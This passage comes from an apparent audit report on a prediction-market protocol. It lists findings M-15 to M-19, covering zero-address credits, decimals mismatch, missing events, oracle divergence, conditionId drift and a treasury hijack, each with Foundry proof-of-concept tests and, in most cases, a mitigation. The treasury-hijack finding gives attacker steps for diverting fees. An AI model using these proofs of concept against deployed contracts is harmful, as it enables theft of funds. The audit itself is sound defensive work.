        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract VaultZeroRecipientTest is Test {
    MintableERC20 internal token;
    Vault internal vault;

    address internal owner = address(0xBEEF);
    address internal marketController = address(0xA11CE);
    address internal user = address(0xB0B);
    bytes32 internal conditionId = keccak256("COND");

    function setUp() public {
        token = new MintableERC20();
        token.mint(user, 1_000e18);

        vault = new Vault();
        vault.initialize(owner, address(token), marketController);

        vm.startPrank(user);
        token.approve(address(vault), type(uint256).max);
        vault.depositCollateral(100e18);
        vm.stopPrank();

        vm.prank(marketController);
        vault.lockCollateral(conditionId, user, 100e18);
        assertEq(vault.getTotalLocked(conditionId), 100e18);
        assertEq(vault.getAvailableBalance(user), 0);
    }

    function test_unlockCollateral_to_zero_creates_stranded_balance() public {
        vm.prank(marketController);
        vault.unlockCollateral(conditionId, address(0), 100e18);

        assertEq(vault.getTotalLocked(conditionId), 0);
        assertEq(vault.getAvailableBalance(address(0)), 100e18);
        assertEq(vault.getAvailableBalance(user), 0);
        // Zero address cannot withdraw; only controller could later recover via transferBetweenUsers
    }

    function test_batchUnlockCollateral_to_zero_creates_stranded_balance() public {
        // Recreate locked state
        vm.startPrank(user);
        vault.depositCollateral(100e18);
        vm.stopPrank();
        vm.prank(marketController);
        vault.lockCollateral(conditionId, user, 100e18);

        bytes32[] memory ids = new bytes32[](1);
        ids[0] = conditionId;
        address[] memory usersArr = new address[](1);
        usersArr[0] = address(0);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100e18;

        vm.prank(marketController);
        vault.batchUnlockCollateral(ids, usersArr, amounts);

        assertEq(vault.getTotalLocked(conditionId), 0);
        assertEq(vault.getAvailableBalance(address(0)), 100e18);
    }
}


## Suggested Mitigation
Add non-zero recipient validation to unlockCollateral and batchUnlockCollateral to enforce invariants and prevent accidental crediting of the zero address:
- In unlockCollateral: require(user != address(0), "Invalid recipient");
- In batchUnlockCollateral loop: require(users[i] != address(0), "Invalid recipient");
Optionally assert the same for lockCollateral to keep inputs consistent. This fully prevents zero-address credits and the associated accounting inconsistency.





 **Derived From** : Changing collateral token can mix decimals and break balance units

## [M-15]. Decimals-mismatched collateral swap in Vault.updateCollateralToken freezes withdrawals and corrupts balances

## Derived From Pattern/Invariant
Changing collateral token can mix decimals and break balance units

## Exploit Type
ERC20DecimalsMismatch

## Location
Vault.updateCollateralToken

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
## Minimim Privilege Required
RequireAdminRole

## Description
Vault.updateCollateralToken replaces the underlying ERC20 without any decimals check or migration. If owner switches from a 6-dec token (USDC) to an 18-dec token (DAI), existing userBalances and totalLockedPerCondition remain recorded in the old unit scale, while transfers now use the new token. This immediately bricks withdrawals (vault holds old token but tries to transfer new token), and even if the owner injects new tokens, amounts are mis-scaled by 1e12, violating invariants and causing value loss/misallocation.

Vulnerable snippet:
function updateCollateralToken(address _collateralToken) external onlyOwner {
    require(_collateralToken != address(0), "Invalid collateral token");
    collateralToken = IERC20(_collateralToken); // no decimals check or rescaling
}

## Impact
Owner switching collateral from 6→18 decimals freezes all existing users' withdrawals (vault has zero balance of new token). If owner funds the vault with same-unit amounts of the new token, users withdraw 1e12x less value than deposited, breaking accounting and economic invariants.

## Proof of Concept
1) Deploy Vault with a 6-dec token (USDC-like) and deposit 1e6 units (1 USDC). 2) Owner calls updateCollateralToken to an 18-dec token (DAI-like). 3) User attempts withdrawCollateral(1e6) and it reverts because the vault holds no DAI. 4) Even if owner mints 1e6 DAI units to the vault to "unfreeze", the user withdraws only 1e6 wei of DAI (1e-12 DAI), whereas their original deposit corresponds to 1e18 wei in 18-dec scale—demonstrably 1e12x less.

## Proof of Code
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {Vault} from "src/Vault/Vault.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ERC20Dec is ERC20 {
    uint8 private _dec;
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s) { _dec = d; }
    function decimals() public view override returns (uint8) { return _dec; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract VaultDecimalsMismatchTest is Test {
    Vault vault;
    ERC20Dec usdc6; // 6 decimals
    ERC20Dec dai18; // 18 decimals
    address owner = address(0xA11CE);
    address user = address(0xB0B);

    function setUp() public {
        usdc6 = new ERC20Dec("USDC", "USDC", 6);
        dai18 = new ERC20Dec("DAI", "DAI", 18);

        Vault impl = new Vault();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeWithSelector(
                Vault.initialize.selector,
                owner,
                address(usdc6),
                address(this) // dummy marketController
            )
        );
        vault = Vault(address(proxy));
    }

    function test_updateCollateralToken_DecimalsMismatch_FreezesAndMiscalculates() public {
        // User deposits 1 USDC (6 decimals => 1_000_000 units)
        uint256 deposit6 = 1_000_000;
        usdc6.mint(user, deposit6);
        vm.startPrank(user);
        usdc6.approve(address(vault), deposit6);
        vault.depositCollateral(deposit6);
        vm.stopPrank();
        assertEq(vault.getAvailableBalance(user), deposit6);

        // Admin switches collateral to 18-dec DAI
        vm.prank(owner);
        vault.updateCollateralToken(address(dai18));

        // Withdrawals are now frozen (vault holds 0 DAI)
        vm.prank(user);
        vm.expectRevert();
        vault.withdrawCollateral(deposit6);

        // Admin tries to "refill" vault with same integer amount as recorded in accounting
        dai18.mint(address(vault), deposit6); // wrong scale

        // Withdraw now succeeds but value is 1e12x less
        vm.prank(user);
        vault.withdrawCollateral(deposit6);
        assertEq(dai18.balanceOf(user), deposit6); // 1e6 wei of 18-dec token = 1e-12 DAI
        uint256 depositNormalizedTo18 = deposit6 * 1e12; // expected 1e18 wei if preserving value
        assertLt(dai18.balanceOf(user), depositNormalizedTo18);
    }
}


## Suggested Mitigation
Best: remove updateCollateralToken entirely and migrate via a new Vault instance. If keeping it, enforce a safe, pausible, same-decimals-only update: 1) add collateralDecimals stored at initialize from IERC20Metadata(_collateralToken).decimals(); 2) in updateCollateralToken require(paused == true), require(IERC20Metadata(_collateralToken).decimals() == collateralDecimals), and require(address(_collateralToken) != address(collateralToken)); 3) optionally require the old collateral balance in the vault to be zero or add a controlled rescue function (onlyOwner, whenPaused) to sweep non-current collateral tokens before/after the switch. Do not attempt on-chain rescaling of userBalances/locked amounts; if decimals must change, deploy a new vault and perform an off-chain/user-driven migration.





 **Derived From** : On successful mint/burn, contract emits PositionTokensMinted/PositionTokensBurned events with correct arrays and conditionId as declared in IPositionTokens

## [L-16]. PositionTokens.mintBatch/burn fail to emit IPositionTokens events, breaking event contract and off-chain invariants

## Derived From Pattern/Invariant
On successful mint/burn, contract emits PositionTokensMinted/PositionTokensBurned events with correct arrays and conditionId as declared in IPositionTokens

## Exploit Type
EventConsistency

## Location
PositionTokens.mintBatch

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
## Minimim Privilege Required
Permissionless

## Description
IPositionTokens declares PositionTokensMinted/PositionTokensBurned events that carry conditionId, but PositionTokens emits only ERC1155 TransferSingle/TransferBatch and never emits the interface-specific events. As a result, off-chain indexers relying on the declared contract-level events cannot correlate token flows with conditionId. Because tokenId = keccak256(conditionId, outcome), off-chain consumers cannot recover conditionId from Transfer events. This breaks referential consistency between the interface and implementation and can impair off-chain orderbook, monitoring, and analytics that depend on these events to maintain inventory, fee attribution, and collateralization checks per condition. Vulnerable snippet (no custom events emitted):

function mintBatch(address to, uint256[] calldata ids, uint256[] calldata amounts) external onlyMarketController { _mintBatch(to, ids, amounts, ""); }

function burn(address from, uint256 id, uint256 amount) external onlyMarketController { _burn(from, id, amount); }

function burnBatch(address from, uint256[] calldata ids, uint256[] calldata amounts) external onlyMarketController { _burnBatch(from, ids, amounts); }

## Impact
The implementation does not emit the interface-declared PositionTokensMinted/PositionTokensBurned events, preventing off-chain systems from reliably associating mints/burns with a specific conditionId. Since tokenId = keccak256(conditionId, outcome) is not invertible, indexers cannot recover conditionId from ERC1155 Transfer events alone. This creates a specification mismatch and breaks off-chain analytics/monitoring that depend on these events, but does not threaten on-chain assets or protocol safety.

## Proof of Concept
1) Attacker submits orders that settle via JIT minting or token swaps.
2) MarketController calls PositionTokens.mintBatch/burn[Batch].
3) PositionTokens emits only ERC1155 Transfer* events; no PositionTokensMinted/Burned are emitted.
4) Indexers/subgraphs listening to IPositionTokens events fail to detect mints/burns and cannot map tokenId to conditionId, breaking off-chain invariants (e.g., inventory by condition, fee attribution, locked collateral vs supply checks). This degrades liveness of matching/monitoring systems and can be abused by spamming trades to cause repeated off-chain desync/failed fills.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {PositionTokens} from "../src/Token/PositionTokens.sol";

contract PositionTokensEventInvariantTest is Test {
    PositionTokens internal token;
    address internal owner = address(this);
    address internal controller = address(0xBEEF);
    address internal user = address(0xCAFE);

    bytes32 internal constant COND = keccak256("cond-1");

    function setUp() public {
        token = new PositionTokens();
        token.initialize(owner);
        token.setMarketController(controller);
    }

    function _hasTopic(bytes32 sig, Vm.Log[] memory logs) internal pure returns (bool) {
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics.length > 0 && logs[i].topics[0] == sig) {
                return true;
            }
        }
        return false;
    }

    function test_mintBatch_doesNotEmitCustomEvents_andOnlyERC1155() public {
        // Prepare ids/amounts derived from conditionId
        uint256[] memory ids = new uint256[](2);
        ids[0] = token.getTokenId(COND, 1);
        ids[1] = token.getTokenId(COND, 2);
        uint256[] memory amts = new uint256[](2);
        amts[0] = 100;
        amts[1] = 200;

        vm.startPrank(controller);
        vm.recordLogs();
        token.mintBatch(user, ids, amts);
        Vm.Log[] memory logs = vm.getRecordedLogs();
        vm.stopPrank();

        // Event signatures
        bytes32 sigTransferBatch = keccak256("TransferBatch(address,address,address,uint256[],uint256[])");
        bytes32 sigMinted = keccak256("PositionTokensMinted(address,uint256[],uint256[],bytes32)");

        // Assert ERC1155 TransferBatch is present
        bool sawTransferBatch = _hasTopic(sigTransferBatch, logs);
        assertTrue(sawTransferBatch, "ERC1155 TransferBatch not seen on mintBatch");

        // Assert custom PositionTokensMinted is NOT present
        bool sawMinted = _hasTopic(sigMinted, logs);
        assertFalse(sawMinted, "PositionTokensMinted should have been emitted but was not");
    }

    function test_burnAndBurnBatch_doNotEmitCustomEvents() public {
        // Mint first so burn does not revert
        uint256[] memory ids = new uint256[](2);
        ids[0] = token.getTokenId(COND, 1);
        ids[1] = token.getTokenId(COND, 2);
        uint256[] memory amts = new uint256[](2);
        amts[0] = 50;
        amts[1] = 30;

        vm.startPrank(controller);
        token.mintBatch(user, ids, amts);

        // burn (single)
        vm.recordLogs();
        token.burn(user, ids[0], 10);
        Vm.Log[] memory logsSingle = vm.getRecordedLogs();

        bytes32 sigTransferSingle = keccak256("TransferSingle(address,address,address,uint256,uint256)");
        bytes32 sigBurned = keccak256("PositionTokensBurned(address,uint256[],uint256[],bytes32)");

        bool sawTransferSingle = _hasTopic(sigTransferSingle, logsSingle);
        assertTrue(sawTransferSingle, "ERC1155 TransferSingle not seen on burn");
        bool sawBurnedSingle = _hasTopic(sigBurned, logsSingle);
        assertFalse(sawBurnedSingle, "PositionTokensBurned should have been emitted (single burn)");

        // burnBatch
        uint256[] memory burnIds = new uint256[](2);
        burnIds[0] = ids[0];
        burnIds[1] = ids[1];
        uint256[] memory burnAmts = new uint256[](2);
        burnAmts[0] = 20;
        burnAmts[1] = 10;

        vm.recordLogs();
        token.burnBatch(user, burnIds, burnAmts);
        Vm.Log[] memory logsBatch = vm.getRecordedLogs();
        vm.stopPrank();

        bytes32 sigTransferBatch = keccak256("TransferBatch(address,address,address,uint256[],uint256[])");
        bool sawTransferBatch = _hasTopic(sigTransferBatch, logsBatch);
        assertTrue(sawTransferBatch, "ERC1155 TransferBatch not seen on burnBatch");
        bool sawBurnedBatch = _hasTopic(sigBurned, logsBatch);
        assertFalse(sawBurnedBatch, "PositionTokensBurned should have been emitted (burnBatch)");
    }
}


## Suggested Mitigation
Align implementation with the IPositionTokens event contract by emitting PositionTokensMinted/PositionTokensBurned along with conditionId. Because conditionId cannot be derived from tokenId, the contract must be provided conditionId at the time of mint/burn: (a) add new functions that enforce single-condition semantics, e.g., mintBatchForCondition(address to, bytes32 conditionId, uint256[] ids, uint256[] amounts) and burn[Batch]ForCondition(...), require all ids belong to conditionId, and emit the events; keep existing functions temporarily for backward compatibility but mark them deprecated; or (b) maintain a mapping tokenId => conditionId set on first mint via a controller-only setter (requiring conditionId input at that time), then read it to emit events on subsequent mints/burns. Also override supportsInterface to include type(IPositionTokens).interfaceId so integrators can detect the extended interface.





 **Derived From** : oracle == marketResolver.oracle() at all times

## [M-17]. Claims DoS: Divergent oracle between MarketController and MarketResolver bricks all redemptions and strands locked collateral

## Derived From Pattern/Invariant
oracle == marketResolver.oracle() at all times

## Exploit Type
EventConsistency

## Location
MarketController.updateOracle|claimWinnings

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
## Minimim Privilege Required
RequireAdminRole

## Description
ConditionId includes the oracle address. MarketController uses its own storage oracle to compute conditionId at trade/claim time, while MarketResolver resolves using its own oracle. If owner rotates only one side (e.g., controller.updateOracle to B, resolver.oracle remains A), then claimWinnings builds a different conditionId than the one resolved. That makes getResolutionStatus(conditionId) false and/or userBalance zero for the computed tokenId, causing claim reverts and permanently locking the vault’s collateral. Vulnerable paths: MarketController.claimWinnings: bytes32 conditionId = market.getConditionId(oracle, questionId, numberOfOutcomes, epoch); MarketResolver._resolveMarketEpochInternal: bytes32 conditionId = getConditionId(oracle, questionId, numberOfOutcomes, epoch);

## Impact
If the oracle address in MarketController diverges from the one in MarketResolver, conditionId computation differs between trading/claiming and resolution. As a result, claims for the affected epochs revert and collateral remains locked under the original conditionId. This is an admin-induced DoS (misconfiguration) that blocks redemptions until configuration is resynchronized; funds are not permanently lost but remain inaccessible without privileged intervention.

## Proof of Concept
1) Deploy with oracle A on both MarketController and MarketResolver.
2) Users trade; positions are minted and collateral locked under conditionId(A, qId, n, epoch).
3) Resolver (oracle A) resolves the epoch: sets merkle root for conditionId(A, ...).
4) Admin accidentally updates only MarketController.oracle to B (resolver still A).
5) A user tries to claim: MarketController recomputes conditionId(B, ...) and queries MarketResolver.getResolutionStatus(B, ...), which is false. The claim reverts with "Market not resolved". Collateral under conditionId(A, ...) remains locked until the admin re-synchronizes oracles.

## Proof of Code
pragma solidity 0.8.26;
import "forge-std/Test.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {MarketController} from "src/Market/MarketController.sol";
import {MarketResolver} from "src/Market/MarketResolver.sol";
import {PositionTokens} from "src/Token/PositionTokens.sol";
import {Vault} from "src/Vault/Vault.sol";
import {MarketContract} from "src/Market/Market.sol";
import {IMarketController} from "src/Market/IMarketController.sol";

contract OracleDivergenceDoSTest is Test {
    ERC20Mock usdc;
    MarketContract market;
    MarketResolver resolver;
    PositionTokens tokens;
    Vault vault;
    MarketController controller;

    address owner = address(this);
    uint256 alicePk = 0xA11CE;
    uint256 bobPk   = 0xB0B;
    address alice = vm.addr(alicePk);
    address bob   = vm.addr(bobPk);
    address matcher = address(0xCAFE);
    address oracleA = address(0x0A);
    address oracleB = address(0x0B);

    function setUp() public {
        // Collateral token
        usdc = new ERC20Mock();
        // Core contracts
        market = new MarketContract();
        market.initialize(owner);
        resolver = new MarketResolver();
        resolver.initialize(owner, oracleA);
        tokens = new PositionTokens();
        tokens.initialize(owner);
        vault = new Vault();
        vault.initialize(owner, address(usdc), address(0xDEAD));
        controller = new MarketController();
        controller.initialize(owner, address(tokens), address(resolver), address(vault), address(market), oracleA);

        // Wire controller
        market.setMarketController(address(controller));
        tokens.setMarketController(address(controller));
        vault.setMarketController(address(controller));
        resolver.setEmergencyResolver(address(controller));

        // Authorize matcher
        controller.setAuthorizedMatcher(matcher, true);

        // Mint and deposit collateral
        usdc.mint(alice, 1_000_000e18);
        usdc.mint(bob,   1_000_000e18);
        vm.startPrank(alice);
        usdc.approve(address(vault), type(uint256).max);
        vault.depositCollateral(100_000e18);
        vm.stopPrank();
        vm.startPrank(bob);
        usdc.approve(address(vault), type(uint256).max);
        vault.depositCollateral(100_000e18);
        vm.stopPrank();

        // Create market
        bytes32 qId = keccak256("Q-ORACLE-DIVERGENCE");
        vm.prank(matcher);
        controller.createMarket(qId, 2, 0, 0); // manual epochs
    }

    function _signOrder(IMarketController.Order memory o, uint256 pk) internal view returns (bytes memory sig) {
        bytes32 digest = controller.getOrderHash(o);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        sig = abi.encodePacked(r, s, v);
    }

    function test_ClaimsDoS_WhenControllerOracleDiffersFromResolverOracle() public {
        bytes32 qId = keccak256("Q-ORACLE-DIVERGENCE");
        uint256 outcomeYES = 1; // 1<<0
        uint256 amount = 1000;
        uint256 priceBps = 6000; // 60%

        // Prepare EIP712 orders
        IMarketController.Order memory buy = IMarketController.Order({
            user: alice,
            questionId: qId,
            outcome: outcomeYES,
            amount: amount,
            price: priceBps,
            nonce: 1,
            expiration: block.timestamp + 1 days,
            isBuyOrder: true
        });
        IMarketController.Order memory sell = IMarketController.Order({
            user: bob,
            questionId: qId,
            outcome: outcomeYES,
            amount: amount,
            price: priceBps,
            nonce: 1,
            expiration: block.timestamp + 1 days,
            isBuyOrder: false
        });
        bytes memory sigBuy = _signOrder(buy, alicePk);
        bytes memory sigSell = _signOrder(sell, bobPk);

        // Execute match (JIT minting path)
        vm.prank(matcher);
        controller.executeOrderMatch(buy, sell, sigBuy, sigSell, amount);

        // Capture epoch used at trade time
        uint256 epoch = market.getCurrentEpoch(qId);
        uint256 outcomes = market.getOutcomeCount(qId);

        // Resolve with oracle A (resolver.oracle == A)
        bytes32 leaf = keccak256(abi.encodePacked(outcomeYES));
        vm.prank(oracleA);
        resolver.resolveMarketEpoch(qId, epoch, outcomes, leaf);
        bytes32 condA = resolver.getConditionId(oracleA, qId, outcomes, epoch);
        assertTrue(resolver.getResolutionStatus(condA));

        // Owner rotates ONLY controller.oracle to B (resolver.oracle remains A)
        controller.updateOracle(oracleB);
        assertEq(controller.oracle(), oracleB);
        assertEq(resolver.oracle(), oracleA);

        // Alice attempts claim => recomputed conditionId uses B; resolver has no status for that => revert
        vm.startPrank(alice);
        bytes32[] memory proof = new bytes32[](0);
        vm.expectRevert(bytes("Market not resolved"));
        controller.claimWinnings(qId, epoch, outcomeYES, proof);
        vm.stopPrank();

        // Collateral remains locked under conditionId(A,...)
        bytes32 condFromMarketA = market.getConditionId(oracleA, qId, outcomes, epoch);
        assertGt(vault.getTotalLocked(condFromMarketA), 0);
    }
}


## Suggested Mitigation
Make conditionId derivation single-sourced and immutable per (questionId, epoch):
- Remove the mutable oracle field from MarketController and stop using it for conditionId. Store an oracle snapshot per (questionId, epoch) in Market at the first use of that epoch (e.g., first trade/mint), and have Market expose getConditionIdSnapshot(questionId, epoch) that always returns keccak256(snapshotOracle, questionId, outcomeCount, epoch).
- Update MarketResolver to read the snapshot oracle (via Market) when computing conditionId during resolution, or accept a conditionId parameter that must match Market.getConditionIdSnapshot and verify it, ensuring both components write/read the same key.
- If refactoring MarketResolver is undesirable, at minimum compute conditionId in MarketController using marketResolver.oracle() AND verify that the oracle matches the snapshot stored in Market for that (questionId, epoch); otherwise revert. However, the robust fix is to persist the oracle snapshot and use it everywhere.
- Optionally, provide a single admin function that atomically updates both controller/resolver oracle settings and disallow updates while unresolved positions exist, but prefer the snapshot approach to fully eliminate the footgun.





 **Derived From** : For existing q, conditionId must be computed with numberOfOutcomes == getOutcomeCount(q): getConditionId(oracle,q,k,epoch) == keccak256(abi.encodePacked(oracle,q,getOutcomeCount(q),(epoch==0? getCurrentEpoch(q): epoch)))

## [L-18]. MarketContract.getConditionId accepts caller-supplied outcomeCount, causing conditionId drift and unclaimable markets

## Derived From Pattern/Invariant
For existing q, conditionId must be computed with numberOfOutcomes == getOutcomeCount(q): getConditionId(oracle,q,k,epoch) == keccak256(abi.encodePacked(oracle,q,getOutcomeCount(q),(epoch==0? getCurrentEpoch(q): epoch)))

## Exploit Type
EventConsistency

## Location
MarketContract.getConditionId

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
## Minimim Privilege Required
RequiresRole

## Description
getConditionId returns keccak256(oracle, questionId, numberOfOutcomes, epoch) using the caller-provided numberOfOutcomes. It only enforces numberOfOutcomes <= 256 and does not check marketExists nor equality with stored outcomeCount[questionId]. This breaks referential integrity across MarketResolver and PositionTokens. A resolver (or any component) that accidentally passes an outcomeCount different from the stored outcomeCount will record resolution data under a different conditionId than the one used to mint/track tokens and lock collateral. As a result, claims against the correct market conditionId will never resolve (DoS on claims, locked collateral). Vulnerable snippet:

function getConditionId(address oracle, bytes32 questionId, uint256 numberOfOutcomes, uint256 epoch) external view returns (bytes32) {
    require(numberOfOutcomes <= 256, "Maximum 256 outcomes supported");
    uint256 targetEpoch = epoch == 0 ? getCurrentEpoch(questionId) : epoch;
    return keccak256(abi.encodePacked(oracle, questionId, numberOfOutcomes, targetEpoch));
}

## Impact
getConditionId allows callers to supply an arbitrary numberOfOutcomes, so any privileged component (e.g., oracle/resolver) that passes a mismatched value will derive a different conditionId than the one used to mint/track positions. This causes resolution data to be written under the wrong key, making the correct epoch unclaimable until the oracle corrects it. This is a data integrity footgun requiring privileged misuse (oracle error), not an attacker-controlled exploit. Assets are indirectly affected via a DoS on claims for the affected epoch, resolvable only by re-writing under the canonical conditionId.

## Proof of Concept
1) Create a market with outcomeCount=2 and epoch=1.
2) Compute the canonical conditionId using the stored outcomeCount (2).
3) Have the oracle resolve using numberOfOutcomes=3; the resolver records status/root under a different conditionId.
4) Reads/claims using the canonical conditionId (2) observe no resolution, while the wrong conditionId (3) appears resolved, demonstrating referential integrity break and DoS on claims.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {MarketContract} from "src/Market/Market.sol";

contract MockResolver {
    MarketContract public market;
    address public oracle;
    mapping(bytes32 => bool) public resolved;

    constructor(MarketContract _market, address _oracle) {
        market = _market;
        oracle = _oracle;
    }

    function resolve(bytes32 questionId, uint256 epoch, uint256 numberOfOutcomes) external {
        require(msg.sender == oracle, "not oracle");
        bytes32 cid = market.getConditionId(oracle, questionId, numberOfOutcomes, epoch);
        resolved[cid] = true;
    }

    function isResolved(bytes32 cid) external view returns (bool) {
        return resolved[cid];
    }
}

contract ConditionIdKDriftTest is Test {
    MarketContract market;
    MockResolver resolver;

    address owner = address(0xA11CE);
    address oracle = address(0x0BEEF);
    bytes32 q = keccak256("Q-EXAMPLE");

    function setUp() public {
        market = new MarketContract();
        market.initialize(owner);

        vm.prank(owner);
        market.setMarketController(address(this));

        // Create a binary market: outcomeCount=2, manual epochs
        market.createMarket(q, 2, 0, 0);

        resolver = new MockResolver(market, oracle);
    }

    function test_conditionIdDrift_whenWrongOutcomeCountUsed() public {
        uint256 stored = market.getOutcomeCount(q); // 2
        uint256 epoch = market.getCurrentEpoch(q);   // 1

        // Canonical conditionId uses stored outcomeCount
        bytes32 cidRight = market.getConditionId(oracle, q, stored, epoch);

        // Wrong outcomeCount (still <= 256)
        uint256 wrongK = stored + 1; // 3
        assertTrue(wrongK <= 256);

        bytes32 cidWrong = market.getConditionId(oracle, q, wrongK, epoch);
        assertTrue(cidRight != cidWrong, "conditionIds must differ on mismatched outcomeCount");

        // Oracle writes resolution under cidWrong
        vm.prank(oracle);
        resolver.resolve(q, epoch, wrongK);

        // The correct conditionId remains unresolved (claims would fail)
        assertTrue(resolver.isResolved(cidWrong), "wrong conditionId not resolved");
        assertFalse(resolver.isResolved(cidRight), "correct conditionId unexpectedly resolved");
    }
}


## Suggested Mitigation
Eliminate the footgun by removing caller-controlled numberOfOutcomes from conditionId derivation on all write/read paths:
- In MarketContract.getConditionId, require the market to exist and compute using the stored outcomeCount[questionId] instead of a caller parameter. Suggested signature: getConditionId(address oracle, bytes32 questionId, uint256 epoch) returns (bytes32), and inside: require(marketExists[questionId]); uint256 k = outcomeCount[questionId]; uint256 e = epoch==0 ? getCurrentEpoch(questionId) : epoch; return keccak256(abi.encodePacked(oracle, questionId, k, e)).
- If backward compatibility requires keeping the parameter, enforce strict equality: require(numberOfOutcomes == outcomeCount[questionId], "outcomeCount mismatch"); and require(marketExists[questionId]).
- Update MarketResolver and any integrators to stop accepting numberOfOutcomes; always fetch the canonical value from MarketContract when deriving conditionId for resolution and verification.
- Optionally disallow epoch==0 on resolution entry points, or consistently normalize it across both writes and reads to avoid ambiguity.





 **Derived From** : Authorized matchers can set treasury and redirect all protocol fees

## [M-19]. Authorized matcher can hijack treasury in MarketController.setTreasury and siphon all fees

## Derived From Pattern/Invariant
Authorized matchers can set treasury and redirect all protocol fees

## Exploit Type
AccessControl

## Location
MarketController.setTreasury

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
## Minimim Privilege Required
RequiresRole

## Description
The treasury address determines the recipient of all trade and claim fees. In MarketController.setTreasury, access is guarded by onlyAuthorizedMatcher rather than onlyOwner, despite interface/docs indicating owner-only control. Any authorized matcher (intended for order execution) can change treasury to an attacker-controlled address. Fees are then continuously sent to this address in _executeTokenSwap, _executeJITMinting, _processPayout, and batchClaimWinnings, making the diversion immediate and ongoing. Vulnerable snippet:

function setTreasury(address _treasury) external onlyAuthorizedMatcher {
    require(_treasury != address(0), "Invalid treasury address");
    address oldTreasury = treasury;
    treasury = _treasury;
    emit TreasuryUpdated(oldTreasury, _treasury);
}


## Impact
Because setTreasury is gated by onlyAuthorizedMatcher instead of onlyOwner, any authorized matcher (or a compromised matcher key) can set the treasury to an attacker-controlled address and also raise trade/claim fees (up to 10%) via setTradeFeeRate and setFeeRate. This diverts all protocol fee revenue (trade fees on execution and claim fees on payout) to the attacker for as long as the setting persists. User principal remains safeguarded (beyond fees), but protocol income is stolen and unrecoverable for that period. Impact is ongoing until corrected and thus materially harms protocol economics.

## Proof of Concept
1) Attacker obtains or compromises an authorized matcher key.
2) Attacker calls setTreasury(attacker) to hijack fee recipient.
3) Attacker optionally raises trade fees to max (10%) via setTradeFeeRate to maximize extraction.
4) Attacker executes order matches between honest users (executeOrderMatch) so trade fees are charged and sent to the attacker-controlled treasury via Vault.transferBetweenUsers.
5) Similarly, when users claim winnings, claim fees are also sent to attacker.
6) Owner can reset treasury, but diverted fees are already gone.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {MarketController} from "src/Market/MarketController.sol";
import {IMarketController} from "src/Market/IMarketController.sol";
import {IMarket} from "src/Market/IMarket.sol";
import {MarketResolver} from "src/Market/MarketResolver.sol";
import {PositionTokens} from "src/Token/PositionTokens.sol";
import {Vault} from "src/Vault/Vault.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract MockMarket is IMarket {
    mapping(bytes32 => uint256) private outcomeCount;
    mapping(bytes32 => bool) private exists;
    address public marketController_;

    function createMarket(bytes32 questionId, uint256 outcomeCnt, uint256, uint256) external override {
        outcomeCount[questionId] = outcomeCnt;
        exists[questionId] = true;
        emit MarketCreated(questionId, outcomeCnt, 0, 0);
    }

    function updateResolutionTime(bytes32, uint256) external override {}
    function advanceEpoch(bytes32) external override {}
    function isMarketOpen(bytes32) external pure override returns (bool) { return true; }
    function isMarketReadyForResolution(bytes32) external pure override returns (bool) { return false; }
    function getResolutionTime(bytes32) external pure override returns (uint256) { return 0; }
    function getCreationTime(bytes32) external pure override returns (uint256) { return block.timestamp; }
    function getConditionId(address oracle, bytes32 questionId, uint256 numberOfOutcomes, uint256 epoch)
        external
        pure
        override
        returns (bytes32)
    {
        return keccak256(abi.encodePacked(oracle, questionId, numberOfOutcomes, epoch));
        }
    function getOutcomeCount(bytes32 questionId) external view override returns (uint256) { return outcomeCount[questionId]; }
    function getCurrentEpoch(bytes32) external pure override returns (uint256) { return 0; }
    function getEpochDuration(bytes32) external pure override returns (uint256) { return 0; }
    function getEpochStartTime(bytes32, uint256) external pure override returns (uint256) { return 0; }
    function getEpochEndTime(bytes32, uint256) external pure override returns (uint256) { return 0; }
    function getMarketExists(bytes32 questionId) external view override returns (bool) { return exists[questionId]; }
    function setMarketController(address mc) external override { marketController_ = mc; }
    function marketController() external view returns (address) { return marketController_; }
}

contract AccessControl_SetTreasury_Test is Test {
    MarketController controller;
    MarketResolver resolver;
    PositionTokens positionTokens;
    Vault vault;
    MockMarket market;
    ERC20Mock usdc;

    address owner;
    address oracle;
    uint256 attackerPk;
    address attacker;
    uint256 buyerPk;
    address buyer;
    uint256 sellerPk;
    address seller;

    function setUp() public {
        owner = address(0xA11CE);
        oracle = address(0x0BEEF);
        attackerPk = 0xBEEF;
        attacker = vm.addr(attackerPk);
        buyerPk = 0x1234;
        buyer = vm.addr(buyerPk);
        sellerPk = 0x5678;
        seller = vm.addr(sellerPk);

        // Collateral token (18 decimals mock)
        usdc = new ERC20Mock();

        // Core contracts
        vault = new Vault();
        vault.initialize(owner, address(usdc), address(this)); // temp controller

        positionTokens = new PositionTokens();
        positionTokens.initialize(owner);

        resolver = new MarketResolver();
        resolver.initialize(owner, oracle);

        market = new MockMarket();

        controller = new MarketController();
